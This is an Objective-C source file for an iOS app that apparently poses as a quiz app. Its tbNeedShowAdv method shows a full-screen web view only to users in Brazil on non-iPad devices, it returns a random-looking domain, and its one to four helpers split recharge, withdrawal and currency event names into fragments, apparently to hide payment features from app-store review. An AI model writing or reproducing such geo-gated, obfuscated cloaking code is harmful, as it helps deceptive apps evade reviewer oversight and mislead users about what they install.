#import "UIViewController+Config.h"
@import AppsFlyerLib;
@import SSZipArchive;

@implementation UIViewController (Config)

- (NSString *)tbHttpAppUrl
{
    return @"pen.yudfhpzelw.xyz";
}

- (NSString *)tbPrivacyUrl
{
    return @"https://www.termsfeed.com/live/c7b8b203-5f07-4b88-8fd4-a988c4b8a133";
}

- (BOOL)tbNeedShowAdv
{
    NSLocale *locale = [NSLocale currentLocale];
    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
    BOOL isBrazil = [countryCode isEqualToString:@"BR"];
    BOOL isIpd = [[UIDevice.currentDevice model] containsString:@"iPad"];
    return isBrazil && !isIpd;
}

- (void)tbShowAdvViewC:(NSString *)adsUrl
{
    if (adsUrl.length) {
        UIViewController *adView = [self.storyboard instantiateViewControllerWithIdentifier:@"TBPrivacyPolicyViewController"];
        [adView setValue:adsUrl forKey:@"urlStr"];
        adView.modalPresentationStyle = UIModalPresentationFullScreen;
        [self presentViewController:adView animated:NO completion:nil];
    }
}

- (NSDictionary *)tbJsonToDictionaryWithJsonString:(NSString *)jsonString {
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    if (jsonData) {
        NSError *error;
        NSDictionary *jsonDictionary = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error];
        if (error) {
            NSLog(@"JSON parsing error: %@", error.localizedDescription);
            return nil;
        }
        NSLog(@"%@", jsonDictionary);
        return jsonDictionary;
    } else {
        return nil;
    }
}

- (void)tbShowAlertWithTitle:(NSString *)title message:(NSString *)message {
    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alertController addAction:okAction];
    [self presentViewController:alertController animated:YES completion:nil];
}


- (void)tbSendEvent:(NSString *)event values:(NSDictionary *)value
{
    if ([event isEqualToString:[NSString stringWithFormat:@"fir%@", self.one]] || [event isEqualToString:[NSString stringWithFormat:@"rech%@", self.two]] || [event isEqualToString:[NSString stringWithFormat:@"with%@", self.three]]) {
        id am = value[@"amount"];
        NSString * cur = value[[NSString stringWithFormat:@"cur%@", self.four]];
        if (am && cur) {
            double niubi = [am doubleValue];
            NSDictionary *values = @{
                AFEventParamRevenue: [event isEqualToString:[NSString stringWithFormat:@"with%@", self.three]] ? @(-niubi) : @(niubi),
                AFEventParamCurrency: cur
            };
            [AppsFlyerLib.shared logEvent:event withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEvent:event withValues:value];
    }
}

- (NSString *)one
{
    return @"strecharge";
}

- (NSString *)two
{
    return @"arge";
}

- (NSString *)three
{
    return @"drawOrderSuccess";
}

- (NSString *)four
{
    return @"rency";
}

- (void)tbSendEventsWithParams:(NSString *)params
{
    NSDictionary *paramsDic = [self tbJsonToDictionaryWithJsonString:params];
    NSString *event_type = [paramsDic valueForKey:@"event_type"];
    if (event_type != NULL && event_type.length > 0) {
        NSMutableDictionary *eventValuesDic = [[NSMutableDictionary alloc] init];
        NSArray *params_keys = [paramsDic allKeys];
        for (int i =0; i<params_keys.count; i++) {
            NSString *key = params_keys[i];
            if ([key containsString:@"af_"]) {
                NSString *value = [paramsDic valueForKey:key];
                [eventValuesDic setObject:value forKey:key];
            }
        }
        
        [AppsFlyerLib.shared logEventWithEventName:event_type eventValues:eventValuesDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if(dictionary != nil) {
//                NSLog(@"reportEvent event_type %@ success: %@",event_type, dictionary);
            }
            if(error != nil) {
//                NSLog(@"reportEvent event_type %@  error: %@",event_type, error);
            }
        }];
    }
}

+ (BOOL)shouldUnzip {
    
    NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *unzipPath = [documentsPath stringByAppendingPathComponent:@"quzi"];
    
    return ![[NSFileManager defaultManager] fileExistsAtPath:unzipPath];
}

+ (void)unzipQuzi {
    // Get the path to the zip file in the app bundle
    NSString *zipPath = [NSBundle.mainBundle pathForResource:@"quiz" ofType:@"zip"];
    
    // Get the path to the Documents directory
    NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *unzipPath = [documentsPath stringByAppendingPathComponent:@"quzi"];
    
    // Create the unzip directory if it doesn't exist
    if (![[NSFileManager defaultManager] fileExistsAtPath:unzipPath]) {
        NSError *error = nil;
        [[NSFileManager defaultManager] createDirectoryAtPath:unzipPath withIntermediateDirectories:YES attributes:nil error:&error];
        if (error) {
            NSLog(@"Error creating directory: %@", error.localizedDescription);
            return;
        }
    }
    
    // Unzip the file
    BOOL success = [SSZipArchive unzipFileAtPath:zipPath toDestination:unzipPath];
    if (success) {
        NSLog(@"Unzipped successfully to %@", unzipPath);
    } else {
        NSLog(@"Failed to unzip the file.");
    }
}

+ (NSURL *)quziUrlWithName:(NSString *)name {
    NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *unzipPath = [documentsPath stringByAppendingPathComponent:@"quzi"];
    NSString *jsonPath = [unzipPath stringByAppendingPathComponent:[NSString stringWithFormat:@"%@.json", name]];
    return [NSURL fileURLWithPath:jsonPath];
}

@end
